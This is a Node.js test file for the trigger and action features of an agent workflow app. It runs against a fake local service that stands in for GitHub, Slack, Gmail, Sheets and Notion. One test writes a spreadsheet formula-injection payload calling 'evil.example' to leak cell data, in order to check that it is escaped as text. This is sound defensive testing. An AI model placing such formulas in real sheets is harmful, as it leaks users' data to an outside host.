// App triggers: a workflow starts when something new shows up in Gmail, a Google Sheet, Slack, GitHub, Notion,
// a feed or a web page. Also the new actions (a sheet row, a Notion page, closing an issue). A fake service and
// temporary data only.
import test from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import http from 'node:http';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { parseFeed, triggerConfig } from '../app-triggers.mjs';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const wait = ms => new Promise(r => setTimeout(r, ms));
async function until(fn, ms = 15000, what = 'condition') { const end = Date.now() + ms; for (;;) { const v = await fn(); if (v) return v; if (Date.now() > end) throw Error('Timed out waiting for ' + what); await wait(100); } }

test('feeds are read oldest first, and trigger settings are checked', () => {
  const rss = '<rss><channel><item><title>Two &amp; more</title><link>https://x.example/2</link><guid>g2</guid><description><![CDATA[<p>Second <b>post</b></p>]]></description></item><item><title>One</title><guid>g1</guid></item></channel></rss>';
  assert.deepEqual(parseFeed(rss).map(i => [i.id, i.title]), [['g1', 'One'], ['g2', 'Two & more']]);
  assert.equal(parseFeed(rss)[1].text, 'Second post');
  const atom = '<feed><entry><id>urn:a</id><title>Atom one</title><link href="https://x.example/a"/><summary>Hi</summary></entry></feed>';
  assert.deepEqual(parseFeed(atom).map(i => [i.id, i.link]), [['urn:a', 'https://x.example/a']]);
  assert.throws(() => triggerConfig({ kind: 'nope' }), /Pick what/);
  assert.throws(() => triggerConfig({ kind: 'github.issue' }), /repository/i);
  assert.throws(() => triggerConfig({ kind: 'github.issue', repo: 'not a repo' }), /owner\/name/);
  assert.throws(() => triggerConfig({ kind: 'web.feed', url: 'http://example.com/feed' }), /https/);
  assert.throws(() => triggerConfig({ kind: 'google.sheet_row', sheet: 'short' }), /link of the Google Sheet/);
  assert.deepEqual(triggerConfig({ kind: 'google.sheet_row', sheet: 'https://docs.google.com/spreadsheets/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012345/edit', tab: '', extra: 'x' }), { kind: 'google.sheet_row', sheet: 'https://docs.google.com/spreadsheets/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012345/edit', every: 60 });
  assert.equal(triggerConfig({ kind: 'google.event_soon', minutes: '99999' }).minutes, '1440');
});

test('workflows start on new things in apps, once each, and new actions wait for you', async t => {
  // What the fake apps hold right now. The test changes it as it goes.
  const app = {
    issues: [{ number: 1, title: 'Old issue', user: { login: 'ana' }, labels: [] }],
    feed: ['old-1', 'old-2'], page: 'Price 100. Sold out.',
    rows: [['Client', 'Amount'], ['Mircea', '350']],
    slack: [{ ts: '1700000000.000100', text: 'old message', user: 'U1' }],
    gmail: ['m1'], notionFails: true,
  };
  const seen = [];
  const fake = http.createServer(async (req, res) => {
    let body = ''; for await (const c of req) body += c;
    const u = new URL(req.url, 'http://x'), p = u.pathname; seen.push({ method: req.method, path: p, query: u.search, body });
    const json = (d, s = 200) => { res.writeHead(s, { 'Content-Type': 'application/json' }); res.end(JSON.stringify(d)); };
    if (p === '/github/user') return json({ login: 'octo' });
    if (p === '/github/repos/acme/plant/issues' && req.method === 'GET') return json([...app.issues].reverse());
    if (p === '/github/repos/acme/plant/issues/1' && req.method === 'PATCH') return json({ number: 1, state: 'closed', html_url: 'https://github.com/acme/plant/issues/1' });
    if (p === '/github/repos/acme/plant/issues/1/comments' && req.method === 'POST') return json({ id: 9 }, 201);
    if (p === '/slack/auth.test') return json({ ok: true, user: 'silo', team: 'Acme' });
    if (p === '/slack/conversations.history') { const oldest = Number(u.searchParams.get('oldest') || 0); return json({ ok: true, messages: app.slack.filter(m => Number(m.ts) > oldest).reverse() }); }
    if (p === '/notion/users/me') return json({ name: 'SILO integration' });
    if (p.startsWith('/notion/databases/') && p.endsWith('/query')) return app.notionFails ? json({ message: 'Could not find database' }, 404) : json({ results: [] });
    if (p === '/notion/databases/0123456789abcdef0123456789abcdef') return json({ properties: { Task: { type: 'title' }, Done: { type: 'checkbox' } } });
    if (p === '/notion/pages' && req.method === 'POST') return json({ id: 'p1', url: 'https://notion.so/p1' });
    if (p === '/googleToken') return json({ access_token: 'g-access', refresh_token: 'g-refresh', expires_in: 3600 });
    if (p === '/gmail/users/me/profile') return json({ emailAddress: 'me@example.com' });
    if (p === '/gmail/users/me/messages') return json({ messages: [...app.gmail].reverse().map(id => ({ id })) });
    if (p.startsWith('/gmail/users/me/messages/')) { const id = p.split('/').pop(); return json({ id, payload: { mimeType: 'text/plain', headers: [{ name: 'Subject', value: 'Invoice ' + id }, { name: 'From', value: 'bob@example.com' }], body: { data: Buffer.from('Please pay invoice ' + id).toString('base64url') } } }); }
    if (p.startsWith('/sheets/spreadsheets/') && p.includes('/values/') && p.endsWith(':append')) return json({ updates: { updatedRange: 'Orders!A4:C4' } });
    if (p.startsWith('/sheets/spreadsheets/') && p.includes('/values/Dup')) return json({ range: 'Dup!A1:C3', values: [['Client', 'Amount', 'Amount'], ['Mircea', '350', '20'], ['Ana', '90']] });
    if (p.startsWith('/sheets/spreadsheets/')) return json({ range: 'Sheet1!A1:Z5000', values: app.rows });
    if (p === '/feed.xml') { res.writeHead(200, { 'Content-Type': 'application/rss+xml' }); return res.end('<rss><channel>' + [...app.feed].reverse().map(id => `<item><title>Post ${id}</title><guid>${id}</guid><description>About ${id}</description></item>`).join('') + '</channel></rss>'); }
    if (p === '/page') { res.writeHead(200, { 'Content-Type': 'text/html' }); return res.end(`<html><body><h1>Shop</h1><p>${app.page}</p></body></html>`); }
    json({ error: 'not found ' + p }, 404);
  });
  await new Promise(r => fake.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${fake.address().port}`;
  const temp = await fs.mkdtemp(path.join(os.tmpdir(), 'silo-triggers-'));
  const port = 14367, api = `http://127.0.0.1:${port}`;
  const child = spawn(process.execPath, ['--import', './tests/provider-mock.mjs', 'server.mjs'], { cwd: root, env: { ...process.env, PORT: String(port), SILO_DATA_DIR: path.join(temp, 'data'), SILO_WORK_DIR: path.join(temp, 'workspace'), SILO_TEST_CONNECTOR_BASE: base, SILO_APP_TRIGGER_INTERVAL: '300', OPENAI_API_KEY: '', ANTHROPIC_API_KEY: '', COMPATIBLE_API_KEY: '', SILO_SECRET: '' }, stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true });
  let errors = ''; child.stderr.on('data', b => { errors += b; });
  t.after(async () => { child.kill(); fake.close(); await new Promise(r => { if (child.exitCode !== null) return r(); child.once('exit', r); setTimeout(r, 3000); }); await wait(300); const resolved = path.resolve(temp); assert.ok(path.basename(resolved).startsWith('silo-triggers-')); await fs.rm(resolved, { recursive: true, force: true, maxRetries: 5, retryDelay: 300 }); });
  await new Promise((resolve, reject) => { const timer = setTimeout(() => reject(Error('Test server did not start: ' + errors)), 15000); child.stdout.on('data', b => { if (b.toString().includes('SILO is ready')) { clearTimeout(timer); resolve(); } }); });
  const ses = await fetch(api + '/api/session'); const { token } = await ses.json(), cookie = ses.headers.get('set-cookie').split(';')[0];
  const request = async (route, body, method = body === undefined ? 'GET' : 'POST') => { const r = await fetch(api + '/api' + route, { method, headers: { cookie, origin: api, 'Content-Type': 'application/json', 'x-silo-token': token }, body: body === undefined ? undefined : JSON.stringify(body) }); return { status: r.status, data: await r.json().catch(() => null) }; };
  const state = async () => (await request('/state')).data;
  const first = (await state()).agents[0];
  const flow = (name, appTrigger) => request('/workflows', { name, steps: [{ agentId: first.id, prompt: 'Handle it.' }], app: appTrigger });
  const runsOf = async id => (await state()).runs.filter(r => r.workflowId === id && r.trigger === 'app');
  const checked = id => until(async () => (await state()).workflows.find(w => w.id === id)?.appChecked, 15000, 'first check');

  await t.test('an app that is not connected cannot be picked', async () => {
    const r = await flow('Issues', { kind: 'github.issue', repo: 'acme/plant' });
    assert.equal(r.status, 400); assert.match(r.data.error, /Connect GitHub/);
    assert.ok((await state()).appTriggers.some(x => x.kind === 'google.sheet_row'), 'the page gets the list');
  });

  await t.test('a new GitHub issue starts the workflow once; old issues and pull requests do not', async () => {
    assert.equal((await request('/services/github', { token: 'ghp_fixturetoken1234567890' })).status, 200);
    const w = (await flow('Issues', { kind: 'github.issue', repo: 'acme/plant' })).data;
    await checked(w.id); await wait(800);
    assert.equal((await runsOf(w.id)).length, 0, 'what was there before is left alone');
    app.issues.push({ number: 2, title: 'Pump 3 leaks', body: 'Water on level 12.', user: { login: 'bob' }, labels: [{ name: 'bug' }] }, { number: 3, title: 'A PR', pull_request: {}, user: { login: 'c' } });
    const runs = await until(async () => { const r = await runsOf(w.id); return r.length ? r : null; }, 15000, 'issue run');
    assert.match(runs[0].input, /New issue on GitHub\. It comes from outside the silo/);
    assert.match(runs[0].input, /<event source="github.issue">[\s\S]*Issue #2 in acme\/plant: Pump 3 leaks[\s\S]*Water on level 12/);
    await wait(1200);
    assert.equal((await runsOf(w.id)).length, 1, 'once each, and not for the pull request');
  });

  await t.test('feeds and web pages need no account', async () => {
    const feed = (await flow('Feed', { kind: 'web.feed', url: base + '/feed.xml' })).data;
    const page = (await flow('Page', { kind: 'web.page', url: base + '/page', contains: 'in stock' })).data;
    await checked(feed.id); await checked(page.id); await wait(600);
    app.feed.push('new-3'); app.page = 'Price 90. Sold out.';
    const runs = await until(async () => { const r = await runsOf(feed.id); return r.length ? r : null; }, 15000, 'feed run');
    assert.match(runs[0].input, /Post new-3/); assert.doesNotMatch(runs[0].input, /old-1/);
    await wait(1000); assert.equal((await runsOf(page.id)).length, 0, 'changed, but not what you are waiting for');
    app.page = 'Price 90. Back in stock.';
    const pr = await until(async () => { const r = await runsOf(page.id); return r.length ? r : null; }, 15000, 'page run');
    assert.match(pr[0].input, /Back in stock/);
  });

  await t.test('Slack messages, Gmail, sheet rows; a failing app shows why and does not stop the others', async () => {
    assert.equal((await request('/services/slack', { token: 'xoxb-fixture-slack-token' })).status, 200);
    const st = await request('/services/google', { clientId: 'cid.apps.googleusercontent.com', clientSecret: 'GOCSPX-fixture' });
    const auth = new URL(st.data.url);
    assert.match(await (await fetch(`${api}/connect/callback?state=${auth.searchParams.get('state')}&code=good-code`)).text(), /Google is connected/);
    assert.match(auth.searchParams.get('scope'), /auth\/spreadsheets/);
    assert.equal((await request('/services/notion', { token: 'secret_fixturenotiontoken123' })).status, 200);
    const slack = (await flow('Slack', { kind: 'slack.message', channel: 'C0123456', contains: 'help' })).data;
    const mail = (await flow('Mail', { kind: 'google.mail', query: 'from:bob' })).data;
    const sheet = (await flow('Sheet', { kind: 'google.sheet_row', sheet: 'https://docs.google.com/spreadsheets/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012345/edit' })).data;
    const notion = (await flow('Notion', { kind: 'notion.database', database: '0123456789abcdef0123456789abcdef' })).data;
    for (const w of [slack, mail, sheet, notion]) await checked(w.id);
    await wait(600);
    app.slack.push({ ts: '1800000000.000200', text: 'nothing to see', user: 'U2' }, { ts: '1800000001.000300', text: 'I need help with pump 3', user: 'U3' });
    app.gmail.push('m2'); app.rows.push(['Ana', '1200']);
    const sr = await until(async () => { const r = await runsOf(slack.id); return r.length ? r : null; }, 15000, 'slack run');
    assert.match(sr[0].input, /I need help with pump 3/);
    const mr = await until(async () => { const r = await runsOf(mail.id); return r.length ? r : null; }, 15000, 'mail run');
    assert.match(mr[0].input, /Subject: Invoice m2[\s\S]*Please pay invoice m2/); assert.doesNotMatch(mr[0].input, /Invoice m1/);
    const rr = await until(async () => { const r = await runsOf(sheet.id); return r.length ? r : null; }, 15000, 'sheet run');
    assert.match(rr[0].input, /Sheet row 3\nClient: Ana\nAmount: 1200/);
    assert.ok(seen.some(x => x.path === '/gmail/users/me/messages' && decodeURIComponent(x.query).includes('from:bob')));
    await wait(800);
    assert.equal((await runsOf(slack.id)).length, 1, 'only the message with the word');
    const n = (await state()).workflows.find(w => w.id === notion.id);
    assert.match(n.appError, /404|Could not find database/);
  });

  await t.test('a trigger can be turned off', async () => {
    const w = (await state()).workflows.find(x => x.name === 'Issues');
    const off = await request('/workflows/' + w.id, { ...w, app: null }, 'PUT');
    assert.equal(off.status, 200, JSON.stringify(off.data));
    assert.equal((await state()).workflows.find(x => x.id === w.id).app, null);
  });

  await t.test('new actions: a sheet row, a Notion page and closing an issue wait for you', async () => {
    await request('/connections', { provider: 'compatible', key: 'fixture-key', model: 'fixture', endpoint: 'https://example.com/v1/chat/completions' });
    const clerk = (await request('/agents', { name: 'Clerk', role: 'Fixture', floor: 3, provider: 'compatible', model: 'tool-user', instructions: 'Fixture.', tools: ['google', 'github', 'notion'] })).data;
    const CALL = o => 'CALL ' + JSON.stringify(o);
    const approve = async (call, tool, detail) => {
      const pending = request('/agents/' + clerk.id + '/chat', { message: CALL(call) });
      const req = await until(async () => (await state()).requests.find(x => x.status === 'pending'), 15000, 'approval');
      assert.equal(req.tool, tool); assert.match(req.detail, detail);
      await request('/requests/' + req.id, { allow: true });
      return (await pending).data.text;
    };
    assert.match(await approve({ tool: 'google', action: 'sheet_append', sheet: '1AbCdEfGhIjKlMnOpQrStUvWxYz012345', range: 'Orders', values: ['Ana', '1200', '2026-11-09'] }, 'google:sheet_append', /Row: Ana \| 1200 \| 2026-11-09/), /Added at Orders!A4:C4/);
    const append = seen.filter(x => x.path.endsWith(':append')).at(-1);
    assert.deepEqual(JSON.parse(append.body), { values: [['Ana', '1200', '2026-11-09']] }); assert.match(append.query, /valueInputOption=USER_ENTERED/);
    // Text that looks like a formula, like a mail subject, is written as text; a negative number stays a number.
    await approve({ tool: 'google', action: 'sheet_append', sheet: '1AbCdEfGhIjKlMnOpQrStUvWxYz012345', range: 'Orders', values: ['=IMPORTDATA("https://evil.example/?"&A1)', '+A1', '@SUM(A:A)', '-A1', '-12.5', '- a note'] }, 'google:sheet_append', /Row:/);
    assert.deepEqual(JSON.parse(seen.filter(x => x.path.endsWith(':append')).at(-1).body).values[0], ['\'=IMPORTDATA("https://evil.example/?"&A1)', "'+A1", "'@SUM(A:A)", "'-A1", '-12.5', "'- a note"]);
    assert.match(await approve({ tool: 'notion', action: 'create_page', database: 'https://www.notion.so/acme/0123456789abcdef0123456789abcdef?v=1', title: 'Fix pump 3', text: 'Level 12.' }, 'notion:create_page', /Title: Fix pump 3/), /notion\.so\/p1/);
    const page = JSON.parse(seen.find(x => x.path === '/notion/pages').body);
    assert.equal(page.properties.Task.title[0].text.content, 'Fix pump 3'); assert.equal(page.parent.database_id, '0123456789abcdef0123456789abcdef');
    assert.match(await approve({ tool: 'github', action: 'close_issue', repo: 'acme/plant', number: 1, text: 'Fixed.' }, 'github:close_issue', /Number: #1/), /Closed #1/);
    assert.equal(JSON.parse(seen.find(x => x.method === 'PATCH').body).state, 'closed');
  });

  await t.test('an app step reads a sheet as named rows, and two columns with one name stay apart', async () => {
    const w = (await request('/workflows', { name: 'Read the sheet', steps: [{ type: 'action', app: 'svc:google', op: 'sheet_read', fields: { sheet: '1AbCdEfGhIjKlMnOpQrStUvWxYz012345', range: 'Dup' } }] })).data;
    const id = (await request('/workflows/' + w.id + '/run', { input: 'go' })).data.id;
    const run = await until(async () => { const r = (await state()).runs.find(x => x.id === id); return r && r.status !== 'running' ? r : null; }, 15000, 'sheet run');
    assert.equal(run.status, 'completed', run.error);
    assert.deepEqual(JSON.parse(run.output), [{ Client: 'Mircea', Amount: '350', 'Amount 2': '20' }, { Client: 'Ana', Amount: '90', 'Amount 2': '' }]);
  });
});
